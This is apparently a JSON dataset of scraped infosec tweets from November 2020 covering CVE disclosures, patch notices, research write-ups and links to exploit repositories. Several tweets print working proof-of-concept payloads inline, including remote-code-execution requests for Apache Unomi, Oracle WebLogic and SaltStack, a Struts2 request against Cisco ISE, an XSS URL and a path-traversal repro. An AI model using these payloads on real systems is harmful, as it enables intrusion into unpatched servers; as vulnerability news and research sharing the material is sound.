+    "tweetfavorites": 225,
+    "tweetquotes": 13,
+    "tweetreplies": 4,
+    "tweetretweets": 181,
+    "tweettext": "WATCH OUT! Google disclosed details of a new zero-day flaw (CVE-2020-17087) in the Windows operating system that's being actively exploited in the wild.\n\nDetails: https://t.co/tgtxsM9N2u\n\n#infosec #cybersecurity",
+    "tweettime": "2020-11-02, 09:45:51",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1323199634538332162",
+    "username": "TheHackersNews"
+}
+{
+    "tweetfavorites": 349,
+    "tweetquotes": 3,
+    "tweetreplies": 2,
+    "tweetretweets": 95,
+    "tweettext": "Quickly confirm if your organization is affected by recent Oracle WebLogic RCE - CVE-2020-14882 on single or list of URLs.\n\nShout out to @dwisiswant0 for sharing the nuclei templates including recent bypass.\n\n#hackwithautomation #bugbountytips #infosec #security https://t.co/qYdfr7GCLP",
+    "tweettime": "2020-11-02, 08:19:40",
+    "tweeturl": "https://twitter.com/pdnuclei/status/1323177945570004994",
+    "username": "pdnuclei"
+}
+{
+    "expanded_url": [
+        "https://chromereleases.googleblog.com/2020/10/stable-channel-update-for-desktop_20.html",
+        "https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/ADV200002",
+        "https://vivaldi.com/blog/news/minor-update-for-vivaldi-desktop-browser-3-4/"
+    ],
+    "tweetfavorites": 32,
+    "tweetquotes": 3,
+    "tweetreplies": 1,
+    "tweetretweets": 26,
+    "tweettext": "⚠️ Please apply the latest Chromium-based browser security updates (e. g. Chromium, Chrome, Microsoft Edge, Vivaldi) to fix FreeType heap-based buffer overflow CVE-2020-15999 which is actively exploited 🔥\nhttps://t.co/gm0LrCFEmM\nhttps://t.co/CB7HHt8FRb\nhttps://t.co/fu6gPRX1gX",
+    "tweettime": "2020-11-01, 19:06:36",
+    "tweeturl": "https://twitter.com/certbund/status/1322978362575540232",
+    "username": "certbund"
+}
+{
+    "expanded_url": [
+        "https://windows-internals.com/exploiting-a-simple-vulnerability-in-35-easy-steps-or-less/",
+        "https://github.com/yardenshafir/CVE-2020-1034"
+    ],
+    "tweetfavorites": 149,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 45,
+    "tweettext": "Exploiting a “Simple” Vulnerability – In 35 Easy Steps or Less! : https://t.co/MeaWzbFCqs credits @yarden_shafir\n\nPoC demonstrating the use of cve-2020-1034 for privilege escalation : https://t.co/odMCuUnvWa https://t.co/7EFzXVgSx2",
+    "tweettime": "2020-11-30, 05:06:42",
+    "tweeturl": "https://twitter.com/binitamshah/status/1333276243861540865",
+    "username": "binitamshah"
+}
+{
+    "expanded_url": [
+        "https://www.drupal.org/sa-core-2020-013"
+    ],
+    "tweetfavorites": 205,
+    "tweetquotes": 3,
+    "tweetreplies": 0,
+    "tweetretweets": 64,
+    "tweettext": "CVE-2020-28949/CVE-2020-28948\nhttps://t.co/2C4KXdQmpv\nRCE on Drupal via Phar Deserialization in PEAR Archive_Tar library. \n\nPoc: phar =&gt; PHAR\nPHAR://malicious_file.phar https://t.co/FS8iAdPg3w",
+    "tweettime": "2020-11-26, 17:18:53",
+    "tweeturl": "https://twitter.com/chybeta/status/1332010953370529793",
+    "username": "chybeta"
+}
+{
+    "expanded_url": [
+        "https://swarm.ptsecurity.com/vulnerabilities-in-checkpoint-ica-management-tool/"
+    ],
+    "tweetfavorites": 133,
+    "tweetquotes": 3,
+    "tweetreplies": 2,
+    "tweetretweets": 60,
+    "tweettext": "Checkpoint ICA Management Tool (CVE-2020-6020) research by Mikhail Klyuchnikov &amp; Nikita Abramov.\n\n1⃣Send /etc/shadow to yourself via SMTP\n2⃣Simple DoS\n\nhttps://t.co/xsC0XVMupq https://t.co/0L6fHJpiW0",
+    "tweettime": "2020-11-25, 14:27:21",
+    "tweeturl": "https://twitter.com/ptswarm/status/1331605399095681024",
+    "username": "ptswarm"
+}
+{
+    "tweetfavorites": 102,
+    "tweetquotes": 0,
+    "tweetreplies": 3,
+    "tweetretweets": 8,
+    "tweettext": "It seems chromium patched my first found since I started hunting for chromium sandbox escape this year(CVE-2020-16018 reported by Man Yue Mo @mmolgtm), really interested in focusing on a new challenging research😋 https://t.co/qwn1cDAwL7",
+    "tweettime": "2020-11-25, 04:07:03",
+    "tweeturl": "https://twitter.com/KeyZ3r0/status/1331449295199899648",
+    "username": "KeyZ3r0"
+}
+{
+    "expanded_url": [
+        "https://webkitgtk.org/security/WSA-2020-0008.html"
+    ],
+    "tweetfavorites": 39,
+    "tweetquotes": 0,
+    "tweetreplies": 3,
+    "tweetretweets": 5,
+    "tweettext": "Some of my Webkit GTK/WPE vulns have been patched :\nhttps://t.co/sNuOOwwVjB\nCVE-2020-13584\nCVE-2020-9951\nMore details next week ;)",
+    "tweettime": "2020-11-23, 22:14:56",
+    "tweeturl": "https://twitter.com/_Icewall/status/1330998292029837321",
+    "username": "_Icewall"
+}
+{
+    "expanded_url": [
+        "https://www.alphabot.com/security/blog/2020/elixir/Remote-code-execution-vulnerability-in-Elixir-based-Paginator-project.html"
+    ],
+    "tweetfavorites": 39,
+    "tweetquotes": 3,
+    "tweetreplies": 3,
+    "tweetretweets": 19,
+    "tweettext": "Write-up of the code execution vulnerability I found in the Elixir-based Paginator project (CVE-2020-15150)\n\nhttps://t.co/sv2zfe6aNv",
+    "tweettime": "2020-11-23, 18:52:48",
+    "tweeturl": "https://twitter.com/ulldma/status/1330947425457102850",
+    "username": "ulldma"
+}
+{
+    "expanded_url": [
+        "https://github.com/yardenshafir/CVE-2020-1034"
+    ],
+    "tweetfavorites": 84,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 33,
+    "tweettext": "GitHub - yardenshafir/CVE-2020-1034: PoC demonstrating the use of cve-2020-1034 for privilege escalation - https://t.co/qsXBcxzu7U",
+    "tweettime": "2020-11-23, 17:38:52",
+    "tweeturl": "https://twitter.com/piedpiper1616/status/1330928818840764417",
+    "username": "piedpiper1616"
+}
+{
+    "expanded_url": [
+        "https://github.com/0xedh/hichip-p2p-firmware-rce"
+    ],
+    "tweetfavorites": 36,
+    "tweetquotes": 3,
+    "tweetreplies": 3,
+    "tweetretweets": 22,
+    "tweettext": "After a while I have published the exploit for CVE-2020-9527, Hichip's P2P cameras RCE. Thanks to @PaulMarrapese for his previous research.\n\nhttps://t.co/n34q3AlE0V",
+    "tweettime": "2020-11-23, 17:01:54",
+    "tweeturl": "https://twitter.com/0xedh/status/1330919517782945794",
+    "username": "0xedh"
+}
+{
+    "expanded_url": [
+        "https://windows-internals.com/exploiting-a-simple-vulnerability-in-35-easy-steps-or-less"
+    ],
+    "tweetfavorites": 480,
+    "tweetquotes": 10,
+    "tweetreplies": 4,
+    "tweetretweets": 156,
+    "tweettext": "I pretended I'm an exploit dev and created a stable exploit to CVE-2020-1034, that's tagged by MS as \"low complexity\". But only if crashing the machine is your only goal:\nhttps://t.co/G0HZffpIq0\nThank you @aionescu for all the help and reviews! 😄 https://t.co/JMbbyJGyxN",
+    "tweettime": "2020-11-23, 12:38:45",
+    "tweeturl": "https://twitter.com/yarden_shafir/status/1330853292352679936",
+    "username": "yarden_shafir"
+}
+{
+    "expanded_url": [
+        "https://support.apple.com/en-in/HT211934"
+    ],
+    "tweetfavorites": 41,
+    "tweetquotes": 0,
+    "tweetreplies": 6,
+    "tweetretweets": 4,
+    "tweettext": "Safari 14.0.1 With Fixes of Address Bar Spoofing Vulnerability.\nCVE-2020-9945\ndetails will be out once the fix is released from different browsers as well.\nhttps://t.co/NSyAtPd8iQ \n#infosec #infosec #hacking #bugbounty https://t.co/yRyyxlD1h7",
+    "tweettime": "2020-11-20, 14:30:55",
+    "tweeturl": "https://twitter.com/imnarendrabhati/status/1329794356841070592",
+    "username": "imnarendrabhati"
+}
+{
+    "tweetfavorites": 368,
+    "tweetquotes": 6,
+    "tweetreplies": 4,
+    "tweetretweets": 103,
+    "tweettext": "Do you known that Cisco ISE is vulnerable to CVE-2017-5638 Apache Struts2 RCE?\n\nPort: 8443\nPayload:\n\nGET /sponsorportal/LoginCheck.action HTTP/1.0\nHost: 10.0.0.1:8443\nUser-Agent: Mozilla\nContent-Type: %{...}\n\nCisco ISE is a NAP system that might be found on network boundaries.",
+    "tweettime": "2020-11-19, 14:58:07",
+    "tweeturl": "https://twitter.com/_mohemiv/status/1329438812158746629",
+    "username": "_mohemiv"
+}
+{
+    "tweetfavorites": 0,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
+    "tweetretweets": 70,
+    "tweettext": "RT @ptswarm: The advisory for multiple unauth RCE in Cisco Integrated Management Controller (CVE-2020-3470) is now out!\n\nBuffer Overflows l…",
+    "tweettime": "2020-11-19, 13:49:51",
+    "tweeturl": "https://twitter.com/jedisct1/status/1329421633287827457",
+    "username": "jedisct1"
+}
+{
+    "expanded_url": [
+        "https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-ucs-api-rce-UXwpeDHd"
+    ],
+    "tweetfavorites": 143,
+    "tweetquotes": 3,
+    "tweetreplies": 1,
+    "tweetretweets": 70,
+    "tweettext": "The advisory for multiple unauth RCE in Cisco Integrated Management Controller (CVE-2020-3470) is now out!\n\nBuffer Overflows lead to RCE with uid=0 (root) privileges\n\nDiscovered by Nikita Abramov\n\nhttps://t.co/s6T3YDswoG https://t.co/8fBFauF8SR",
+    "tweettime": "2020-11-19, 13:32:32",
+    "tweeturl": "https://twitter.com/ptswarm/status/1329417273719853062",
+    "username": "ptswarm"
+}
+{
+    "expanded_url": [
+        "https://t.zsxq.com/3nmuFiY"
+    ],
+    "tweetfavorites": 91,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 30,
+    "tweettext": "CVE-2020-8277 Node.js Denial of Service through DNS request\n\nhttps://t.co/AoPtUPUOPd https://t.co/6ksdv0Y8G2",
+    "tweettime": "2020-11-19, 12:40:03",
+    "tweeturl": "https://twitter.com/chybeta/status/1329404066502299649",
+    "username": "chybeta"
+}
+{
+    "expanded_url": [
+        "https://github.co/3msMoMy"
+    ],
+    "tweetfavorites": 78,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 29,
+    "tweettext": "ICYMI @mmolgtm explains how to exploit CVE-2020-6449, a use-after-free (UAF) in the WebAudio module of Chrome, and achieve a sandboxed RCE. Read also how he used #CodeQL to accelerate his code audit https://t.co/k5ddV8Scv3",
+    "tweettime": "2020-11-18, 15:57:01",
+    "tweeturl": "https://twitter.com/GHSecurityLab/status/1329091248997625857",
+    "username": "GHSecurityLab"
+}
+{
+    "expanded_url": [
+        "https://paper.seebug.org/1398/"
+    ],
+    "tweetfavorites": 52,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 19,
+    "tweettext": "CVE-2020-16846\nCVE-2020-25592\nSaltStack Salt REST API RCE\n\n[PoC]\nPOST /run HTTP/1.1\nHost: [Victim:8888]\n...\n...\n\ntoken=12312&amp;client=ssh&amp;tgt=*&amp;fun=a&amp;roster=whip1ash&amp;ssh_priv=aaa|open%20/System/Applications/Calculator.app%3b\n\nhttps://t.co/jdgIUFSW6x https://t.co/s7xlLDkHDX",
+    "tweettime": "2020-11-18, 06:06:51",
+    "tweeturl": "https://twitter.com/wugeej/status/1328942729095753731",
+    "username": "wugeej"
+}
+{
+    "tweetfavorites": 469,
+    "tweetquotes": 7,
+    "tweetreplies": 12,
+    "tweetretweets": 162,
+    "tweettext": "#CVE-2020-13942 Apache Unomi Remote Code Execution\n\nPoC:\n{\"filters\":[{\"id\" : \"pyn3rd\",\"filters\": [{\"condition\": {\"parameterValues\": {\"pyn3rd\": \"script::Runtime.getRuntime().exec('open -a Calculator')\"},\"type\":\"profilePropertyCondition\"}}]}],\"sessionId\": \"pyn3rd\"} https://t.co/Gcw5FcZiNp",
+    "tweettime": "2020-11-18, 04:38:42",
+    "tweeturl": "https://twitter.com/pyn3rd/status/1328920545442680837",
+    "username": "pyn3rd"
+}
+{
+    "tweetfavorites": 208,
+    "tweetquotes": 2,
+    "tweetreplies": 1,
+    "tweetretweets": 46,
+    "tweettext": "CVE-2020-13942 Apache Unomi pre-auth RCE (bypass CVE-2020-11975 ) https://t.co/q7ppLTJdiT",
+    "tweettime": "2020-11-18, 04:05:59",
+    "tweeturl": "https://twitter.com/chybeta/status/1328912309440311297",
+    "username": "chybeta"
+}
+{
+    "expanded_url": [
+        "https://www.trendmicro.com/en_us/research/20/k/cve-2020-17053-use-after-free-ie-vulnerability.html"
+    ],
+    "tweetfavorites": 135,
+    "tweetquotes": 2,
+    "tweetreplies": 2,
+    "tweetretweets": 48,
+    "tweettext": "When analyzing CVE-2020-1380, I found another path to trigger a similar UAF vulnerability by neutering ArrayBuffer without JIT. \nIt has beed fixed in Microsoft November’s Patch as CVE-2020-17053.\nhttps://t.co/ucHH2cmYVN",
+    "tweettime": "2020-11-18, 02:38:58",
+    "tweeturl": "https://twitter.com/iamelli0t/status/1328890412413534209",
+    "username": "iamelli0t"
+}
+{
+    "expanded_url": [
+        "https://swarm.ptsecurity.com/path-traversal-on-citrix-xenmobile-server/"
+    ],
+    "tweetfavorites": 353,
+    "tweetquotes": 10,
+    "tweetreplies": 1,
+    "tweetretweets": 169,
+    "tweettext": "💥New article \"Path Traversal on Citrix XenMobile Server\" with a step-by-step guide to disclosing encryption keys, decrypting passwords, and thoroughly understanding CVE-2020-8209 by our researcher Andrey Medov.\n\nRead all about it: https://t.co/JMJM0UiSRu\n\nThe PoC⬇️ https://t.co/iRpdYELfjK",
+    "tweettime": "2020-11-16, 14:36:42",
+    "tweeturl": "https://twitter.com/ptswarm/status/1328346259502018560",
+    "username": "ptswarm"
+}
+{
+    "expanded_url": [
+        "https://x-stream.github.io/CVE-2020-26217.html"
+    ],
+    "tweetfavorites": 211,
+    "tweetquotes": 2,
+    "tweetreplies": 2,
+    "tweetretweets": 69,
+    "tweettext": "#CVE-2020-26217 XStream Remote Code Execution \n\nhttps://t.co/baqFucu0BQ https://t.co/o9UHU8eTQv",
+    "tweettime": "2020-11-16, 02:47:32",
+    "tweeturl": "https://twitter.com/pyn3rd/status/1328167793611554819",
+    "username": "pyn3rd"
+}
+{
+    "expanded_url": [
+        "https://blog.zecops.com/vulnerabilities/exploring-the-exploitability-of-bad-neighbor-the-recent-icmpv6-vulnerability-cve-2020-16898/"
+    ],
+    "tweetfavorites": 81,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 48,
+    "tweettext": "Exploring the Exploitability of “Bad Neighbor”: The Recent ICMPv6 Vulnerability (CVE-2020-16898)  https://t.co/WHjYcHvudH  #Pentesting #RCE #Vulnerability #CyberSecurity #Infosec https://t.co/CpYiv9N27y",
+    "tweettime": "2020-11-14, 16:40:20",
+    "tweeturl": "https://twitter.com/ptracesecurity/status/1327652599051464704",
+    "username": "ptracesecurity"
+}
+{
+    "tweetfavorites": 343,
+    "tweetquotes": 3,
+    "tweetreplies": 7,
+    "tweetretweets": 134,
+    "tweettext": "Nothing critical, but here is the PoC for the new CVE I got credited for: CVE-2020-14815. \n\nhttps://target[.]com/bi-security-login/login.jsp?msi=false&amp;redirect=\"&gt;&lt;img/src/onerror%3dalert(document.domain)&gt;\n\nGot a couple of Med in H1 using it. Have Fun!\n\n#bugbounty #bugbountytips https://t.co/A8qx640VgE",
+    "tweettime": "2020-11-12, 16:40:33",
+    "tweeturl": "https://twitter.com/HackerOn2Wheels/status/1326927875279380480",
+    "username": "HackerOn2Wheels"
+}
+{
+    "expanded_url": [
+        "https://www.zdnet.com/article/google-patches-two-more-chrome-zero-days/"
+    ],
+    "tweetfavorites": 157,
+    "tweetquotes": 13,
+    "tweetreplies": 2,
+    "tweetretweets": 94,
+    "tweettext": "BREAKING: Google patches two more Chrome zero-days\n\nThis includes:\n-CVE-2020-16013 - impacts Chrome V8 JS engine\n-CVE-2020-16017 - impacts Chrome's Site Isolation feature\n\nGoogle has now patched five Chrome zero-days in three weeks\n\nhttps://t.co/ohF2CHwvOG https://t.co/BXFa1wzSwR",
+    "tweettime": "2020-11-11, 22:41:32",
+    "tweeturl": "https://twitter.com/campuscodi/status/1326656333580480514",
+    "username": "campuscodi"
+}
+{
+    "expanded_url": [
+        "https://srcincite.io/advisories/src-2020-0025/",
+        "https://srcincite.io/pocs/cve-2020-17083.ps1.txt"
+    ],
+    "tweetfavorites": 201,
+    "tweetquotes": 3,
+    "tweetreplies": 0,
+    "tweetretweets": 124,
+    "tweettext": "Microsoft Exchange Server ExportExchangeCertificate WriteCertiricate File Write Remote Code Execution Vulnerability\n\nCVE: CVE-2020-17083\nAdvisory: https://t.co/sf7upoNmjC\nPoC exploit: https://t.co/lzKWSGhSjG",
+    "tweettime": "2020-11-11, 20:43:16",
+    "tweeturl": "https://twitter.com/sourceincite/status/1326626570073755648",
+    "username": "sourceincite"
+}
+{
+    "expanded_url": [
+        "http://viz.greynoise.io/query/?gnql=tags%3A%22Oracle%20WebLogic%20RCE%20CVE-2020-14882%22",
+        "http://viz.greynoise.io/query/?gnql=tags%3A%22Oracle%20WebLogic%20RCE%20CVE-2020-14750%22"
+    ],
+    "tweetfavorites": 33,
+    "tweetquotes": 3,
+    "tweetreplies": 0,
+    "tweetretweets": 11,
+    "tweettext": "new tags to track recent WebLogic RCE (CVE-2020-14882, 14883, 14750) -\n\nhttps://t.co/XH4J4A5RIh\n\nhttps://t.co/uq9mqYuvHV",
+    "tweettime": "2020-11-11, 17:53:41",
+    "tweeturl": "https://twitter.com/ackmage/status/1326583893080870915",
+    "username": "ackmage"
+}
+{
+    "expanded_url": [
+        "https://thehackernews.com/2020/11/microsoft-releases-windows-security.html"
+    ],
+    "tweetfavorites": 214,
+    "tweetquotes": 12,
+    "tweetreplies": 5,
+    "tweetretweets": 141,
+    "tweettext": "November 2020 Patch Tuesday — #Microsoft releases security updates for 112 newly discovered vulnerabilities, including an actively exploited zero-day flaw (CVE-2020-17087) disclosed by #Google's security team last week.\n\nhttps://t.co/DwSQZTX8v6\n\n#Infosec #CyberSecurity",
+    "tweettime": "2020-11-11, 10:14:04",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1326468227040374784",
+    "username": "TheHackersNews"
+}
+{
+    "expanded_url": [
+        "https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2020-17083"
+    ],
+    "tweetfavorites": 96,
+    "tweetquotes": 4,
+    "tweetreplies": 4,
+    "tweetretweets": 24,
+    "tweettext": "The description for CVE-2020-17083 is wrong, user interaction is *not* required. Also this is RCE as SYSTEM, so the actual CVSS is 8.5: https://t.co/qJWBH3ldCf",
+    "tweettime": "2020-11-10, 22:02:45",
+    "tweeturl": "https://twitter.com/steventseeley/status/1326284184122519561",
+    "username": "steventseeley"
+}
+{
+    "expanded_url": [
+        "https://www.cyberark.com/resources/threat-research-blog/intel-please-stop-assisting-me"
+    ],
+    "tweetfavorites": 40,
+    "tweetquotes": 3,
+    "tweetreplies": 2,
+    "tweetretweets": 15,
+    "tweettext": "This was a long wait, this will be my last blog for some while - CVE-2020-22460, CVE-12330, CVE-2020-12335\nhttps://t.co/ALNAPL16xT",
+    "tweettime": "2020-11-10, 18:10:48",
+    "tweeturl": "https://twitter.com/EranShimony/status/1326225811087749121",
+    "username": "EranShimony"
+}
+{
+    "expanded_url": [
+        "https://sick.codes/extraordinary-vulnerabilities-discovered-in-tcl-android-tvs-now-worlds-3rd-largest-tv-manufacturer/"
+    ],
+    "tweetfavorites": 89,
+    "tweetquotes": 2,
+    "tweetreplies": 2,
+    "tweetretweets": 36,
+    "tweettext": "Critical Vulnerabilities Discovered in TCL Android TVs\n\nCVE-2020-27403\nFull file system browsing of the TV in the browser.\n\nCVE-2020-28055\nWorld writable update folder (malicious updates possible)\n : https://t.co/nahQGxkhGY \n\ncredits @sickcodes  || @johnjhacking",
+    "tweettime": "2020-11-09, 22:56:44",
+    "tweeturl": "https://twitter.com/binitamshah/status/1325935382991523840",
+    "username": "binitamshah"
+}
+{
+    "expanded_url": [
+        "https://community.disclose.io/t/how-i-found-a-tor-vulnerability-in-brave-browser-reported-it-watched-it-get-patched-got-a-cve-cve-2020-8276-and-a-small-bounty-all-in-one-working-day/65"
+    ],
+    "tweetfavorites": 290,
+    "tweetquotes": 2,
+    "tweetreplies": 6,
+    "tweetretweets": 55,
+    "tweettext": "How I found a Tor vulnerability in Brave Browser, reported it, watched it get patched, got a CVE (CVE-2020-8276) and a small bounty, all in one working day : https://t.co/byy6rmUOl7   credits @sickcodes",
+    "tweettime": "2020-11-09, 22:22:46",
+    "tweeturl": "https://twitter.com/binitamshah/status/1325926835591421953",
+    "username": "binitamshah"
+}
+{
+    "expanded_url": [
+        "https://t.zsxq.com/UR3NNVf",
+        "https://saltstack.com/blog/on-november-3-2020-saltstack-publicly-disclosed-three-new-cves/"
+    ],
+    "tweetfavorites": 102,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 35,
+    "tweettext": "CVE-2020-25592  Any value for \"eauth\"/\"token” allow a user to bypass auth and make calls to Salt SSH.\n\nCVE-2020-16846 A user could use shell injections with the Salt API using the SSH Client.  \n\n25592+16846=Unauth RCE \n\n分析 https://t.co/tC20h1LUFq\n\nhttps://t.co/HbyQg9ZuIl https://t.co/YnfKRS7QTt",
+    "tweettime": "2020-11-09, 16:22:27",
+    "tweeturl": "https://twitter.com/chybeta/status/1325836157653934080",
+    "username": "chybeta"
+}
+{
+    "expanded_url": [
+        "https://github.com/pprietosanchez/CVE-2020-14750"
+    ],
+    "tweetfavorites": 335,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 157,
+    "tweettext": "Oracle Weblogic PoC for vulnerabilities CVE-2020-14750 and cve-2020-14882\n\nBe careful ! It is working\n\n./CVE-2020-14750 hostname: 7001 ifconfig lo\n./CVE-2020-14750 hostname: 7001 ls\n./CVE-2020-14750 hostname: 7001 vi etc/passwd\n\nhttps://t.co/UeZof859NP https://t.co/YTH6Ztx6p6",
+    "tweettime": "2020-11-09, 05:35:25",
+    "tweeturl": "https://twitter.com/wugeej/status/1325673327357173762",
+    "username": "wugeej"
+}
+{
+    "tweetfavorites": 769,
+    "tweetquotes": 35,
+    "tweetreplies": 13,
+    "tweetretweets": 307,
+    "tweettext": "Free threat intel - identify and patch VMware ESX vulnerabilities CVE-2019-5544 and CVE-2020-3992. \n\nRansomware group using them to bypass all Windows OS security, by shutting down VMs and encrypting the VMDK’s directly on hypervisor.",
+    "tweettime": "2020-11-07, 02:06:48",
+    "tweeturl": "https://twitter.com/GossiTheDog/status/1324896051128635392",
+    "username": "GossiTheDog"
+}
+{
+    "tweetfavorites": 0,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
+    "tweetretweets": 455,
+    "tweettext": "RT @benhawkes: Apple have fixed three issues reported by Project Zero that were being actively exploited in the wild. CVE-2020-27930 (RCE),…",
+    "tweettime": "2020-11-05, 19:03:14",
+    "tweeturl": "https://twitter.com/cherepanov74/status/1324427068592001025",
+    "username": "cherepanov74"
+}
+{
+    "expanded_url": [
+        "https://support.apple.com/en-us/HT211929"
+    ],
+    "tweetfavorites": 931,
+    "tweetquotes": 144,
+    "tweetreplies": 15,
+    "tweetretweets": 404,
+    "tweettext": "Apple have fixed three issues reported by Project Zero that were being actively exploited in the wild. CVE-2020-27930 (RCE), CVE-2020-27950 (memory leak), and CVE-2020-27932 (kernel privilege escalation). The security bulletin is available here: https://t.co/4OIReajIp6",
+    "tweettime": "2020-11-05, 18:46:37",
+    "tweeturl": "https://twitter.com/benhawkes/status/1324422885830610944",
+    "username": "benhawkes"
+}
+{
+    "expanded_url": [
+        "http://com.tangosol.coherence.mvel2.sh",
+        "https://github.com/jas502n/CVE-2020-14882"
+    ],
+    "tweetfavorites": 182,
+    "tweetquotes": 3,
+    "tweetreplies": 0,
+    "tweetretweets": 69,
+    "tweettext": "CVE-2020-14882\nWeblogic RCE by only one GET reques\n\n#bypass patch \n\nPOST /console/css/%252e%252e%252fconsole.portal HTTP/1.1\n...\n...\n_nfpb=true&amp;_pageLabel=&amp;handle=https://t.co/1P6ayf6Arf.ShellSession(\"java.lang.Runtime.getRuntime().exec('calc.exe');\");\n\nhttps://t.co/SkNAFJi8Dw https://t.co/D1zKwr5W0D",
+    "tweettime": "2020-11-05, 07:51:35",
+    "tweeturl": "https://twitter.com/wugeej/status/1324258040686669824",
+    "username": "wugeej"
+}
+{
+    "expanded_url": [
+        "https://exploitbox.io/vuln/Git-Git-LFS-RCE-Exploit-CVE-2020-27955.html"
+    ],
+    "tweetfavorites": 59,
+    "tweetquotes": 6,
+    "tweetreplies": 0,
+    "tweetretweets": 44,
+    "tweettext": "Git  &amp; GitHub CLI Remote CodeExec #RCE #exploit  via Git LFS CVE-2020-27955 @dawid_golunski\n\nRepo clone to Pwn ;) Full advisory with #PoC at\nhttps://t.co/n0vnrcSUCg\n\n#cybersecurity #infosec #hacking #security  #0day #git #github cli  #vuln #DevOps https://t.co/516I33RxYd",
+    "tweettime": "2020-11-05, 03:53:57",
+    "tweeturl": "https://twitter.com/Exploit_Box/status/1324198238887514112",
+    "username": "Exploit_Box"
+}
+{
+    "expanded_url": [
+        "https://symeonp.github.io/2020/12/08/phonebook-uaf-analysis.html"
+    ],
+    "tweetfavorites": 67,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 29,
+    "tweettext": "How would you exploit this UAF :)?\n\n“Discovery and analysis of a Windows PhoneBook Use-After-Free vulnerability (CVE-2020-1530)”, an instructive blog post by @symeonp:\nhttps://t.co/AHw1uWdm7e",
+    "tweettime": "2020-11-04, 18:46:50",
+    "tweeturl": "https://twitter.com/TimoHirvonen/status/1324060555536117764",
+    "username": "TimoHirvonen"
+}
+{
+    "expanded_url": [
+        "https://wikileaks.org/hackingteam/emails/emailid/45441"
+    ],
+    "tweetfavorites": 127,
+    "tweetquotes": 2,
+    "tweetreplies": 2,
+    "tweetretweets": 69,
+    "tweettext": "CVE-2020-14871 had been exploited and distributed in the wild to numerous groups since at least October 6th 2014. That's 6 years that this vulnerability was available as 0day to multiple non-exclusive parties, VBI leak in HT emails shows it's the same bug. https://t.co/Prh3tm3DHN https://t.co/Efv6jtPFOB",
+    "tweettime": "2020-11-04, 16:15:07",
+    "tweeturl": "https://twitter.com/hackerfantastic/status/1324022373255909377",
+    "username": "hackerfantastic"
+}
+{
+    "tweetfavorites": 136,
+    "tweetquotes": 4,
+    "tweetreplies": 0,
+    "tweetretweets": 36,
+    "tweettext": "For those that want to repro CVE-2020-1300 you can just use makecab, no need to manually calc checksums now:\n\nc:\\&gt;type files.txt\n\"rce.exe\" \"../../rce.exe\"\nc:\\&gt;makecab /f files.txt",
+    "tweettime": "2020-11-03, 18:30:35",
+    "tweeturl": "https://twitter.com/steventseeley/status/1323694078022848512",
+    "username": "steventseeley"
+}
+{
+    "expanded_url": [
+        "https://github.com/hackerhouse-opensource/exploits/blob/master/prdelka-vs-SUN-sshd.tgz"
+    ],
+    "tweetfavorites": 294,
+    "tweetquotes": 3,
+    "tweetreplies": 6,
+    "tweetretweets": 99,
+    "tweettext": "Dirty libssh2 PoC for CVE-2020-14871 to core target and pack with your favorite shellcode &amp; return addresses, something for the kidz on lockdown. Happy Hacking. https://t.co/7dqSGjOXqw https://t.co/UtnyDtxx1s",
+    "tweettime": "2020-11-03, 14:58:13",
+    "tweeturl": "https://twitter.com/hackerfantastic/status/1323640631613394945",
+    "username": "hackerfantastic"
+}
+{
+    "expanded_url": [
+        "https://github.com/RedTeamPentesting/CVE-2020-13935"
+    ],
+    "tweetfavorites": 101,
+    "tweetquotes": 2,
+    "tweetreplies": 1,
+    "tweetretweets": 46,
+    "tweettext": "Exploit for WebSocket Vulnerability in Apache Tomcat (CVE-2020-13935)\n\nAffected Versions:\n10.0.0-M1 to 10.0.0-M6\n9.0.0.M1 to 9.0.36\n8.5.0 to 8.5.56\n8.0.1 to 8.0.53\n7.0.27 to 7.0.104\n\nPoC\nhttps://t.co/zn9K3XLQny https://t.co/5HYieTU47f",
+    "tweettime": "2020-11-03, 06:22:33",
+    "tweeturl": "https://twitter.com/cyber_advising/status/1323510861940596736",
+    "username": "cyber_advising"
+}
+{
+    "expanded_url": [
+        "https://chromereleases.googleblog.com/2020/11/chrome-for-android-update.html"
+    ],
+    "tweetfavorites": 35,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 10,
+    "tweettext": "A few people noticed that CVE-2020-16010 wasn't included in the link above. That's because Chrome has separate release notes for Desktop and Android. The release notes covering CVE-2020-16010 (sandbox escape for Chrome on Android) are now available here: https://t.co/6hBKMuCAaK",
+    "tweettime": "2020-11-03, 01:59:22",
+    "tweeturl": "https://twitter.com/benhawkes/status/1323444628926820352",
+    "username": "benhawkes"
+}
+{
+    "tweetfavorites": 696,
+    "tweetquotes": 26,
+    "tweetreplies": 18,
+    "tweetretweets": 263,
+    "tweettext": "CVE-2020-14871 - well that was easy, SSH pre-auth RCE on Solaris through libpam. As a PoC trigger you need to ensure the remote host is using keyboard-interactive and then reach the vulnerable code path by specifying a blank username to get PAM to hit the vulnerable function. https://t.co/HQtSBBQ6g1",
+    "tweettime": "2020-11-03, 01:07:15",
+    "tweeturl": "https://twitter.com/hackerfantastic/status/1323431512822435841",
+    "username": "hackerfantastic"
+}
+{
+    "expanded_url": [
+        "https://chromereleases.googleblog.com/2020/11/stable-channel-update-for-desktop.html"
+    ],
+    "tweetfavorites": 291,
+    "tweetquotes": 8,
+    "tweetreplies": 5,
+    "tweetretweets": 118,
